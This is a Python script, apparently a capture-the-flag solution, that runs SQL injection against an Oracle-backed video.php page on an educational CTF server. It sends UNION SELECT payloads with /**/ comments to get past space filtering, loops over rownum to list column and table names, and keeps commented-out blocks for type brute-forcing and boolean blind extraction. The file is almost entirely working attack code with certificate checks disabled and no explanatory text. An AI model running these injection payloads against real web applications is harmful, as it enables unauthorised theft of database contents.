import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/'
 #url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES/**/where/**/rownum='
url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/user_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r='
for row_num in range(1, 1000):

    url2 = url + str(row_num)
    result = requests.get(url2, verify=False)

    if 'Error' not in result.text and 'Bad cat!' not in result.text:

        splittext = result.text.splitlines()
        for each_row in splittext:
            if '<h2>' in each_row: #and len(each_row) != 13 and len(each_row) != 9:
                #print(len(each_row))
                print(each_row)
                #print('url now %s'%(url2))


'''
for first in ['null', '1', '%27a%27', '%22a%22' ]:
    for second in ['null', '1', '%27a%27', '%22a%22']:
        for third in ['null', '1', '%27a%27', '%22a%22']:
            payload = '/**/union/**/select/**/' + first + ',' + second + ',' + third + '/**/from/**/dual'

            url2 = url + payload
            result = requests.get(url2, verify=False)

            if 'Error' not in result.text and 'Bad cat!' not in result.text:
                print(result.text)
                print('url now %s'%(url2))
            else:
                print(result.text.splitlines()[-1])
                print('url now %s'%(url2))
'''

'''
for i in range(0, 100):
    url2 = url + '(case/**/when/**/(length(SELECT/**/TABLE_NAME/**/FROM/**/SELECT/**/TABLE_NAME/**/,/**/rownum/**/as/**/r/**/FROM/**/all_tables/**/WHERE/**/r=1)='+ str(i) + ')/**/then/**/1/**/else/**/2/**/end)'
    result = requests.get(url2, verify=False)
    if 'Error' not in result.text:
        print(result.text)

print('end 1')
input()
for i in range(0, 255):
    print('---------------lognumber %d ----------'%(i))

    char = chr(i)
    payload = '(case/**/when/**/(' + char +')/**/then/**/1/**/else/**/2/**/end)'
    print(payload)
    url += payload
    result = requests.get(url, verify=False)

    #if 'Error' not in result.text and 'Bad cat!' not in result.text:
    print(result.text)
#print('--------------')
#print(result.headers)

'''
